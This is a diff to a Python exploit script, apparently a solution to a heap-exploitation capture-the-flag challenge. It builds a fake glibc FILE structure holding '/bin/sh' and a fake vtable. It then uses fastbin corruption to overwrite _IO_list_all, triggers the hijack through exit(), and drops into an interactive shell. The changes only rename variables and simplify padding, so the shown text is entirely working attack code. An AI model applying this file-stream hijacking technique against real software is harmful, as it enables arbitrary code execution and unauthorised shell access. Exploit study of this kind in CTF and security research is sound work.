@@ -56,7 +56,7 @@ dummy_vtable = flat([
 dummy_vtable_addr = malloc(0x100, dummy_vtable)
 log.success(f"dummy_vtable_addr: {hex(dummy_vtable_addr)}")
 
-dummy_file = flat([
+dummy_file_struct = flat([
     b'/bin/sh\x00',         # 0x00 _flags
     p64(0x61),              # 0x08 _IO_read_ptr 
     p64(0) * 2,             # 0x10 - 0x18
@@ -68,8 +68,8 @@ dummy_file = flat([
     p64(dummy_vtable_addr), # 0xd8 vtable
 ])
 
-dummy_file_addr = malloc(0x100, dummy_file)
-log.success(f"dummy_file_addr: {hex(dummy_file_addr)}")
+dummy_file_struct_addr = malloc(0x100, dummy_file_struct)
+log.success(f"dummy_file_addr: {hex(dummy_file_struct_addr)}")
 
 chunk2 = malloc(0x68, b"CCCC")
 chunk3 = malloc(0x68, b"DDDD")
@@ -80,7 +80,7 @@ free(chunk2)
 malloc(0x68, p64(libc.sym._IO_list_all - 35))
 malloc(0x68, b"XXXX")
 malloc(0x68, b"XXXX")
-malloc(0x68, p8(0)*(35-16) + p64(dummy_file_addr))
+malloc(0x68, p8(0) * 19 + p64(dummy_file_struct_addr))
 exit()
 
 io.interactive()
